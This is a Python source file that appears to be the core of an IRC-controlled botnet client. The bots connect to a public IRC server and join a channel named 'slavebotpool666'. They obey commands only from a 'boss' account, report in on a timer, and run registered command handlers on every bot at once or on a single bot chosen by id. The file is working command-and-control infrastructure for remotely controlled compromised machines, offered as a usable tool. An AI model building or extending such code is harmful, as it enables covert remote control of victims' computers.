from typing import Any, List, Callable
from threading import Timer, Thread
from collections import OrderedDict
from argparse import ArgumentParser, HelpFormatter
from pathlib import Path
import socket
import re
import secrets
import logging
import platform
import traceback


RE_PARSE_PRIVMSG = r"^:(?P<owner>\w+)!.+PRIVMSG\s+#(?P<channel>\w+)\s+:\$(?P<commandstr>.+)"
RE_PARSE_COMMADSET = r"(?P<command>\w+)\s*(?P<args>.*)"

logging.basicConfig(level=logging.DEBUG)


def send_bytes(string: str, encoding: str = "utf-8") -> bytes:
    return bytes(string, encoding)


class RepeatedTimer(object):
    def __init__(self, interval, function, *args, **kwargs):
        self._timer = None
        self.interval = interval
        self.function = function
        self.args = args
        self.kwargs = kwargs
        self.is_running = False
        self.start()

    def _run(self):
        self.is_running = False
        self.start()
        self.function(*self.args, **self.kwargs)

    def start(self):
        if not self.is_running:
            self._timer = Timer(self.interval, self._run)
            self._timer.start()
            self.is_running = True

    def stop(self):
        self._timer.cancel()
        self.is_running = False


class ArgsError(Exception):
    pass


class BotArgsParser(ArgumentParser):
    def __init__(self, prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=HelpFormatter, prefix_chars='-', fromfile_prefix_chars=None, argument_default=None, conflict_handler='error', add_help=True, allow_abbrev=True):
        super().__init__(prog=prog, usage=usage, description=description, epilog=epilog, parents=parents, formatter_class=formatter_class, prefix_chars=prefix_chars, fromfile_prefix_chars=fromfile_prefix_chars, argument_default=argument_default, conflict_handler=conflict_handler, add_help=add_help, allow_abbrev=allow_abbrev)
    
    def connect_bot(self, bot):
        self.bot = bot

    def error(self, message):
        self.print_usage(self.bot.send_text_thread(message))
        raise ArgsError

    def _print_message(self, message, file):
        if message:
            self.bot.send_text_thread(message)

    def exit(self, status=0, message=None):
        pass


class Bot:
    sock: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __init__(self, host: str = "chat.freenode.net", port: int = 6667, channel: str = "#slavebotpool666", boss_name="bos666", bot_prefix: str = 'SLAVEBOT', bot_type='Undefined'):
        self.host = host
        self.port = port
        self.channel = channel
        self.boss_name = boss_name
        self.bot_prefix = bot_prefix
        self.bot_type = bot_type
        self.bot_id = secrets.token_hex(3)
        self.bot_fullname = f"{self.bot_prefix}_{self.bot_id}"
        self.SERVER_STATUS = True
        self.COMMAND_SET = dict()
        self.ping_timer: RepeatedTimer = None
        self.ROOT_PATH = Path("~").expanduser()

    def use_other_bot_commands(self, other_bot: Any) -> None:
        self.COMMAND_SET.update(other_bot.COMMAND_SET)

    def read_config_from_dict(self, config: dict) -> None:
        for key, value in config.items():
            setattr(self, key, value)

    def _revc(self, bufsize: int = 2024) -> str:
        return self.sock.recv(bufsize).decode("utf-8").strip('\n\r')

    def join_channel(self):
        self.sock.send(send_bytes(f"JOIN {self.channel}\n"))

    def send_text_thread(self, text: str):
        def thread_send(text):
            self.sock.send(send_bytes(f"PRIVMSG {self.channel} :{line}\n"))
        for line in text.split('\n'):
            th = Thread(target=thread_send, args=(line,))
            th.start()

        del th

    def send_text(self, text: str):
        for line in text.split('\n'):
            self.sock.send(send_bytes(f"PRIVMSG {self.channel} :{line}\n"))

    def pong(self):
        self.send_text("**Im alive**")

    def exit_server(self):
        self.sock.send(send_bytes("QUIT \n"))
        self.sock.close()
        self.ping_timer.stop()
        self.SERVER_STATUS = False

    def execute(self, func_dict, args: List[str]):
        if func_dict['all'] and args[0] == '/all':
            func_dict['func'](bot=self, args=args[1:])
        if self.bot_id == args[0]:
            func_dict['func'](bot=self, args=args[1:])

    def parse_command(self, raw_data: bytes):
        msg_match = re.match(RE_PARSE_PRIVMSG, raw_data)
        if msg_match:
            owner = msg_match.group('owner')
            commandstr = msg_match.group('commandstr')
            if owner == self.boss_name:
                cmd_match = re.match(RE_PARSE_COMMADSET, commandstr)
                if cmd_match:
                    command = cmd_match.group('command')
                    args = cmd_match.group('args').split(' ')

                    st = self.COMMAND_SET.get(command, None)
                    if st is not None:
                        if st['argparse']:
                            try:
                                self.execute(st, args)
                            except ArgsError:
                                pass
                        else:
                            self.execute(st, args)
                    else:
                        self.send_text(f"Command not found")
                        logging.error("Commmand not found")
                else:
                    logging.error("Regex error - cmd_parser")
            else:
                #logging.error("Regex error - privmsg")
                pass

    def listen_forever(self) -> None:
        while self.SERVER_STATUS:
            raw_data = self._revc()
            logging.debug(raw_data)
            self.parse_command(raw_data)

    def connect(self) -> None:
        self.sock.connect((self.host, self.port))
        self.sock.send(send_bytes(
            f"USER {self.bot_fullname} {self.bot_fullname} {self.bot_fullname} {self.bot_fullname}\n"))
        self.sock.send(send_bytes(f"NICK {self.bot_fullname}\n"))
        self.join_channel()
        logging.debug(f"Connected {self.host}")

    def send_command_help(self) -> None:
        for cmdstr, cmd_stuff in OrderedDict(sorted(self.COMMAND_SET.items(), key=lambda x: x[0])).items():
            self.send_text(f"{cmdstr}: {cmd_stuff['help_text']}")

    def connected_afer(self):
        self.send_command_help()
        for cmdstr, cmd_stuff in self.COMMAND_SET.items():
            if cmd_stuff['on_connect'] == True:
                cmd_stuff['func'](bot=self)

        self.ping_timer = RepeatedTimer(60, self.pong)

    def _panic(self):
        self.exit_server()
        self.start()

    def start(self, safe=False):
        if safe:
            try:
                self.connect()
                self.connected_afer()
                self.listen_forever()
            except Exception as e:
                self.send_text_thread(traceback.format_exc())
                self.send_text_thread(
                    "Apparently this command is incorrect. If you can't fix it, don't use it again")
                self.listen_forever()
        else:
            self.connect()
            self.connected_afer()
            self.listen_forever()

    def register(self, cmdstr, all=False, on_connect=False, help_text="No description given", argparse=False):
        def wrap_register(func):
            self.COMMAND_SET[cmdstr] = {
                'all': all, 'on_connect': on_connect, 'help_text': help_text, 'argparse': argparse, 'func': func}
            return func
        return wrap_register
